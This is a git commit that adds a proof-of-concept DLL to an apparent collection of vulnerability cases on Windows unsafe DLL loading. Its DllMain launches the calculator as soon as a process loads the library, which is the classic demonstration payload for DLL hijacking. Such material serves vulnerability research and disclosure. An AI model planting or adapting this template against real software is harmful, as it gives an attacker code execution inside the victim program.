9cd29a0f1538bedef9f0e07eaa9c2fc9e8873e52
Hashim Jawad <hashem.jawad@yahoo.com>
2019-06-13 15:53:42 -0400

    Upload HelloWorld.dll

---
+++ VulnCases/Windows Unsafe DLL Loading/HelloWorld/HelloWorld/HelloWorld.cpp
@@ -0,0 +1,6 @@
+// HelloWorld.cpp : Defines the exported functions for the DLL application.
+//
+
+#include "stdafx.h"
+
+
---
+++ VulnCases/Windows Unsafe DLL Loading/HelloWorld/HelloWorld/dllmain.cpp
@@ -0,0 +1,19 @@
+#include "stdafx.h"
+#include <Windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		WinExec("calc", SW_NORMAL);
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
